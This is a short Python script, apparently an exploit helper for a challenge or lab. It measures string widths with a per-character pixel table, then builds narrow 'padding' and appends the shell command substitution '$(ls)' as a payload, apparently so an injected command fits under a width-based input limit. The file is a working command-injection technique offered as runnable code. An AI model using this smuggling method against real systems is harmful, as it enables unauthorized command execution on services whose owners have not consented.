charWidth = {
  ',': 9.5,
  '-': 14.5,
  '0': 28.5,
  '1': 15.5,
  '2': 19.5,
  '3': 21.5,
  '4': 20.5,
  '5': 22.5,
  '6': 22.5,
  '7': 18.5,
  '8': 21.5,
  '9': 22.5,
  'A': 24.5,
  'B': 24.5,
  'C': 28.5,
  'D': 26.5,
  'E': 23.5,
  'F': 22.5,
  'G': 28.5,
  'H': 25.5,
  'I': 9.5,
  'J': 21.5,
  'K': 23.5,
  'L': 22.5,
  'M': 33.5,
  'N': 25.5,
  'O': 30.5,
  'P': 22.5,
  'Q': 30.5,
  'R': 23.5,
  'S': 22.5,
  'T': 23.5,
  'U': 26.5,
  'V': 25.5,
  'W': 35.5,
  'X': 29.5,
  'Y': 26.5,
  'Z': 26.5,
  '_': 17.5,
  'a': 21.5,
  'b': 23.5,
  'c': 22.5,
  'd': 23.5,
  'e': 23.5,
  'f': 18.5,
  'g': 23.5,
  'h': 24.5,
  'i': 8.5,
  'j': 8.5,
  'k': 20.5,
  'l': 8.5,
  'm': 39.5,
  'n': 24.5,
  'o': 23.5,
  'p': 23.5,
  'q': 23.5,
  'r': 20.5,
  's': 21.5,
  't': 19.5,
  'u': 24.5,
  'v': 23.5,
  'w': 32.5,
  'x': 23.5,
  'y': 24.5,
  'z': 22.5,
  ' ': 12.5
}

def calculate_width(text):
    """Calculate the total width of a string using the charWidth dictionary."""
    total_width = 0
    for char in text:
        if char in charWidth:
            total_width += charWidth[char]

    return total_width

def create_payload_padding():
    """Create a payload that fits within the target width."""
    target_width = 800
    # padding = "i"*80 + "rrllaaII" 
    padding = "i" * 80 + "rrll77"
    width = calculate_width(padding)
    print(f"Calculated width of padding: {width}")
    return padding

# Create the payload
payload = "$(ls)"
final_payload = create_payload_padding() + payload
print(f"\nFinal payload: {repr(final_payload)}")
